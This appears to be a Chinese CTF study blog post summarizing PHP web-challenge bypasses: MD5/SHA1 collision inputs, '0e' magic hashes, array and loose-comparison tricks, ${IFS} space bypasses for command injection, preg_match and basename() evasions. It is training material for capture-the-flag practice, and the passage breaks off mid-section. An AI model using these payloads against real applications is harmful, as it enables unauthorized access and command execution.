{"title":"赛事总结","uid":"a9e106cab2b5b4ec4cb305a164f518b5","slug":"赛事总结","date":"2024-10-28T12:10:30.000Z","updated":"2024-10-28T12:15:19.945Z","comments":true,"path":"api/articles/赛事总结.json","keywords":null,"cover":"/image/8.jpg","content":"<h1 id=\"Ctf经验及其题目总结\"><a href=\"#Ctf经验及其题目总结\" class=\"headerlink\" title=\"Ctf经验及其题目总结\"></a><strong>Ctf</strong>经验及其题目总结</h1><p><strong>l 做题经验：不要忽略</strong>index.php** 和查看<strong>源代码</strong> </p>\n<p>l <strong>robots.txt</strong></p>\n<p>l Sql先测闭合和和注释符</p>\n<h2 id=\"MD5各姿势绕过\"><a href=\"#MD5各姿势绕过\" class=\"headerlink\" title=\"MD5各姿势绕过\"></a>MD5各姿势绕过</h2><h3 id=\"1-判断是否为MD5的关键字\"><a href=\"#1-判断是否为MD5的关键字\" class=\"headerlink\" title=\"1.判断是否为MD5的关键字\"></a><strong>1.判断是否为MD5的关键字</strong></h3><p><strong>ffifdyop</strong> </p>\n<p>​                               </p>\n<h3 id=\"2-MD5比较-（双-）\"><a href=\"#2-MD5比较-（双-）\" class=\"headerlink\" title=\"2.MD5比较 （双&#x3D;&#x3D;）\"></a>2.<strong>MD5</strong>比较 （双&#x3D;&#x3D;）</h3><p>l md5_1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p>\n<p>&amp;md5_2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>\n<p>l $a&#x3D;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2</p>\n<p>$b&#x3D;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2</p>\n<h3 id=\"3：-a-b-md5-a-md5-b\"><a href=\"#3：-a-b-md5-a-md5-b\" class=\"headerlink\" title=\"3：$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)\"></a><strong>3</strong>：$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)</h3><p>​    此时我们需要满足 a 不等于 b 但是 a 和 b 进行 md5 后的数值需要相等</p>\n<p>​    可以让a &#x3D;<strong>QNKCDZO</strong> b&#x3D;&#x3D;<strong>240610708</strong>  s878926199a  s155964671a <code>QLTHNDT</code></p>\n<p>QNKCDZO 和 240610708 进行 md5 后加密的数值为 0e开头，在 PHP 中会被识别为科学计数法，所有 0e 开头的数据进行弱类型比较皆为 True </p>\n<p>​    或者<strong>a[]&#x3D;1&amp;b[]&#x3D;1,md5无法进行数组比较 即可绕过</strong> </p>\n<h3 id=\"4：-强类型比较\"><a href=\"#4：-强类型比较\" class=\"headerlink\" title=\"4：&#x3D;&#x3D;&#x3D;强类型比较\"></a><strong>4</strong>：&#x3D;&#x3D;&#x3D;强类型比较</h3><p> <code>$_POST``[``&#39;param1&#39;``]!==``$_POST``[``&#39;param2&#39;``]&amp;&amp;``md5``(``$_POST``[``&#39;param1&#39;``])===``md5``(``$_POST``[``&#39;param2&#39;``]</code></p>\n<p>··       仍可用数组进行比较<strong>param1[]&#x3D;1&amp;param2[]&#x3D;2</strong></p>\n<p>​    <strong>Or</strong></p>\n<p>​    array1&#x3D;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</p>\n<p>&amp;</p>\n<p>array2&#x3D;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</p>\n<p><strong>or</strong></p>\n<p>​    <strong>a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</strong></p>\n<p><strong>&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</strong></p>\n<p><strong>Sha1</strong></p>\n<p>array1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p>\n<h3 id=\"5-md5-a-md5-md5-b\"><a href=\"#5-md5-a-md5-md5-b\" class=\"headerlink\" title=\"5.md5($a) &#x3D;&#x3D; md5(md5($b)\"></a><strong>5.md5($a) &#x3D;&#x3D; md5(md5($b)</strong></h3><p>md和md5后都是以0e开头的字符串：</p>\n<p>wSfHENKtYMLp9dlXrjTf&#x3D;&gt;0e831574571239196549417613222648</p>\n<p>DZScqjlajV0mrWZl6YUw&#x3D;&gt;0e328945755880883750704598784448</p>\n<h3 id=\"4-a-md5-a\"><a href=\"#4-a-md5-a\" class=\"headerlink\" title=\"4.$a&#x3D;&#x3D;md5($a)\"></a><strong>4.$a&#x3D;&#x3D;md5($a)</strong></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0e215962017</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"php-弱类型总结\"><a href=\"#php-弱类型总结\" class=\"headerlink\" title=\"php 弱类型总结\"></a>php 弱类型总结</h2><h3 id=\"md5\"><a href=\"#md5\" class=\"headerlink\" title=\"md5\"></a>md5</h3><p>上文已总结</p>\n<h3 id=\"json-绕过\"><a href=\"#json-绕过\" class=\"headerlink\" title=\"json 绕过\"></a>json 绕过</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;message&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = <span class=\"title function_ invoke__\">json_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;message&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$key</span> =<span class=\"string\">&quot;*********&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$message</span>-&gt;key == <span class=\"variable\">$key</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag&quot;</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;fail&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">     <span class=\"keyword\">echo</span> <span class=\"string\">&quot;~~~~&quot;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<p>分析：输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0&#x3D;&#x3D;”admin”这种形式绕过</p>\n<p>最终payload <strong>message&#x3D;{“key”:0}</strong>                      </p>\n<h3 id=\"array-search（）-绕过\"><a href=\"#array-search（）-绕过\" class=\"headerlink\" title=\"array_search（） 绕过\"></a>array_search（） 绕过</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"number\">1</span> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"number\">2</span> <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_array</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;test&#x27;</span>]))&#123;<span class=\"keyword\">exit</span>();&#125;</span><br><span class=\"line\"> <span class=\"number\">3</span> <span class=\"variable\">$test</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;test&#x27;</span>];</span><br><span class=\"line\"> <span class=\"number\">4</span> <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">count</span>(<span class=\"variable\">$test</span>);<span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\"> <span class=\"number\">5</span>     <span class=\"keyword\">if</span>(<span class=\"variable\">$test</span>[<span class=\"variable\">$i</span>]===<span class=\"string\">&quot;admin&quot;</span>)&#123;</span><br><span class=\"line\"> <span class=\"number\">6</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;error&quot;</span>;</span><br><span class=\"line\"> <span class=\"number\">7</span>         <span class=\"keyword\">exit</span>();</span><br><span class=\"line\"> <span class=\"number\">8</span>     &#125;</span><br><span class=\"line\"> <span class=\"number\">9</span>     <span class=\"variable\">$test</span>[<span class=\"variable\">$i</span>]=<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$test</span>[<span class=\"variable\">$i</span>]);</span><br><span class=\"line\"><span class=\"number\">10</span> &#125;</span><br><span class=\"line\"><span class=\"number\">11</span> <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">array_search</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"variable\">$test</span>)===<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"><span class=\"number\">12</span>     <span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag&quot;</span>;</span><br><span class=\"line\"><span class=\"number\">13</span> &#125;</span><br><span class=\"line\"><span class=\"number\">14</span> <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\"><span class=\"number\">15</span>     <span class=\"keyword\">echo</span> <span class=\"string\">&quot;false&quot;</span>;</span><br><span class=\"line\"><span class=\"number\">16</span> &#125;</span><br><span class=\"line\"><span class=\"number\">17</span> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>分析：上面是自己写的一个，先判断传入的是不是数组，</p>\n<p>然后循环遍历数组中的每个值，并且数组中的每个键值不能和admin相等，</p>\n<p>并且将每个值转化为int类型，</p>\n<p>再判断传入的数组是否有“admin”，有则返回flag</p>\n<p>payload</p>\n<p> <strong>test&#x3D;[0]</strong></p>\n<p>array_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，则返回匹配该元素所对应的键名。如果没找到，则返回 false</p>\n<p>原因：array_serch()  在判断数组里面有没有 键值与  字符串“admin”相等 的   用的是 &#x3D;&#x3D;  ，根据php弱类型，字符串admin 的值为 0  ，所以构造一个含有0索引位置的键值为0 的数组 test 就可以成功绕过</p>\n<h3 id=\"strcmp（）绕过\"><a href=\"#strcmp（）绕过\" class=\"headerlink\" title=\"strcmp（）绕过\"></a>strcmp（）绕过</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"number\">2</span>     <span class=\"variable\">$password</span>=<span class=\"string\">&quot;***************&quot;</span></span><br><span class=\"line\"> <span class=\"number\">3</span>      <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]))&#123;</span><br><span class=\"line\"> <span class=\"number\">4</span> </span><br><span class=\"line\"> <span class=\"number\">5</span>         <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strcmp</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>], <span class=\"variable\">$password</span>) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\"> <span class=\"number\">6</span>             <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Right!!!login success&quot;</span>;n</span><br><span class=\"line\"> <span class=\"number\">7</span>             <span class=\"keyword\">exit</span>();</span><br><span class=\"line\"> <span class=\"number\">8</span>         &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"> <span class=\"number\">9</span>             <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Wrong password..&quot;</span>;</span><br><span class=\"line\"><span class=\"number\">10</span>         &#125;</span><br><span class=\"line\"><span class=\"number\">11</span> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<p>分析：strcmp是比较两个字符串，如果str1&lt;str2 则返回值&lt;0 ，如果str1大于str2返回&gt;0 ，如果两者相等 返回0</p>\n<p>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个<strong>数组</strong>会怎么样呢</p>\n<p>我们传入 password[]&#x3D;xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</p>\n<p>payload: <strong>password[]&#x3D;xxx</strong></p>\n<h3 id=\"switch（）绕过\"><a href=\"#switch（）绕过\" class=\"headerlink\" title=\"switch（）绕过\"></a>switch（）绕过</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"number\">2</span> <span class=\"variable\">$a</span>=<span class=\"string\">&quot;4admin&quot;</span>;</span><br><span class=\"line\"> <span class=\"number\">3</span> <span class=\"keyword\">switch</span> (<span class=\"variable\">$a</span>) &#123;</span><br><span class=\"line\"> <span class=\"number\">4</span>     <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\"> <span class=\"number\">5</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;fail1&quot;</span>;</span><br><span class=\"line\"> <span class=\"number\">6</span>         <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> <span class=\"number\">7</span>     <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\"> <span class=\"number\">8</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;fail2&quot;</span>;</span><br><span class=\"line\"> <span class=\"number\">9</span>         <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"number\">10</span>     <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\"><span class=\"number\">11</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;fail3&quot;</span>;</span><br><span class=\"line\"><span class=\"number\">12</span>         <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"number\">13</span>     <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\"><span class=\"number\">14</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;sucess&quot;</span>;  <span class=\"comment\">//结果输出success;</span></span><br><span class=\"line\"><span class=\"number\">15</span>         <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"number\">16</span>     <span class=\"keyword\">default</span>:</span><br><span class=\"line\"><span class=\"number\">17</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;failall&quot;</span>;</span><br><span class=\"line\"><span class=\"number\">18</span>         <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"number\">19</span> &#125;</span><br><span class=\"line\"><span class=\"number\">20</span> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>分析 ： 在进行switch 选择时 $a<strong>会被强制转换成整形</strong>进行对照<br>所以 令$a&#x3D;”4asdfs” &#x3D;int（4）成功进行绕过</p>\n<h3 id=\"成也布尔，败也布尔\"><a href=\"#成也布尔，败也布尔\" class=\"headerlink\" title=\"成也布尔，败也布尔\"></a>成也布尔，败也布尔</h3><p>成也布尔，败也布尔‘，布尔类型的true跟任意字符串在‘&#x3D;&#x3D;’下成立</p>\n<h3 id=\"intval绕过\"><a href=\"#intval绕过\" class=\"headerlink\" title=\"intval绕过\"></a>intval绕过</h3><p> <a href=\"https://www.nssctf.cn/problem/2076\">https://www.nssctf.cn/problem/2076</a> </p>\n<p>   <img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241028125954256.png\" alt=\"image-20241028125954256\">                       </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。 </span><br><span class=\"line\">echo intval(array());                 // 0</span><br><span class=\"line\">echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1</span><br></pre></td></tr></table></figure>\n\n<p>传入数组就能绕过<br>a[]&#x3D;1 </p>\n<h3 id=\"linux-rce空格绕过\"><a href=\"#linux-rce空格绕过\" class=\"headerlink\" title=\"linux rce空格绕过\"></a>linux rce空格绕过</h3><p><strong>${IFS}&#x2F;$IFS</strong></p>\n<p> <img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241028130105896.png\" alt=\"image-20241028130105896\"></p>\n<p><strong>空格</strong>替代 eg:<strong>cat &#x2F;1.php &#x3D;&#x3D; cat${IFS}&#x2F;1.php</strong></p>\n<p><strong>&#x3D;的平替like;空格的平替：&#x2F;**&#x2F;, %20, %0a(换行),%a0,(),+;</strong></p>\n<p>8：preg_match绕过 </p>\n<p>1：长度绕过 污染参数，在要传所需参数前传一个无关参数</p>\n<p>Eg:所需参数是cmd 传参是可以  a&#x3D;aaaaaaaaaaaaaaaaaaaaaaaaaa**&amp;cmd&#x3D;xxxxxxxx** <strong>标记部分为参数污染部分</strong></p>\n<p><strong>2：[  空格 + .</strong> 这四个都可以被处理为**_**</p>\n<p><strong>9：</strong>正则绕过及basename()函数 <a href=\"https://www.nssctf.cn/problem/463\">https://www.nssctf.cn/problem/463</a></p>\n<p>详解 <a href=\"https://www.cnblogs.com/FPointzero/p/16438478.html\">https://www.cnblogs.com/FPointzero/p/16438478.html</a></p>\n<p><strong>1：basename()：</strong>返回路径中的文件名部分。但是它有个小问题，它会去掉文件名</p>\n<p>开头的非 ASCII 值。</p>\n<p>例子：<br> 127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;1.php 显示：1.php</p>\n<p>127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;flag.php&#x2F;1.php 显示：1.php</p>\n<p>2：SERVER[′REQUESTURI′]：与 _SERVER[‘PHP_SELF’]的区别是会加上参数</p>\n<p>例子：</p>\n<p>127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;1.php 显示：&#x2F;pikachu&#x2F;index.php?1.php</p>\n<p>3：$_SERVER[‘PHP_SELF’] ：正在执行脚本的文件名</p>\n<p>例子：</p>\n<p>127.0.0.1&#x2F;pikachu&#x2F;index.php 显示：&#x2F;pikachu&#x2F;index.php</p>\n<p>4：<strong>basename()绕过 添加非ascii编码字符 eg：汉字 %a0等</strong></p>\n<p><strong>5：</strong>preg_match中show_source绕过 替换成 show[source, show source, show+source, show.source</p>\n<p><strong>10:</strong> show_souerce</p>\n<p>在 URL 中使用 show_source 是一种 PHP 提供的特殊功能，用于查看指定文件的源代码。当在 URL 中添加 show_source&#x3D;文件路径时，服务器会返回该文件的源代码而不是执行它。</p>\n<h1 id=\"XYCTF\"><a href=\"#XYCTF\" class=\"headerlink\" title=\"XYCTF\"></a>XYCTF</h1><p>复现网站 <a href=\"https://gz.imxbt.cn/\">https://gz.imxbt.cn</a></p>\n<h2 id=\"ezpop\"><a href=\"#ezpop\" class=\"headerlink\" title=\"ezpop\"></a>ezpop</h2><p><a href=\"https://developer.aliyun.com/article/1161068\">https://developer.aliyun.com/article/1161068</a></p>\n<p><a href=\"https://blog.csdn.net/qq_45619909/article/details/122803600\">https://blog.csdn.net/qq_45619909/article/details/122803600</a></p>\n<h3 id=\"GC（垃圾回收）\"><a href=\"#GC（垃圾回收）\" class=\"headerlink\" title=\"GC（垃圾回收）\"></a><strong>GC</strong>（垃圾回收）</h3><p>在PHP中，使用<code>引用计数</code>和<code>回收周期</code>来自动管理内存对象的，当一个变量被设置为<code>NULL</code>，或者没有任何指针指向</p>\n<p>时，它就会被变成垃圾，被<code>GC</code>机制自动回收掉</p>\n<p><code>zval</code>的变量容器</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240508203842897.png\" 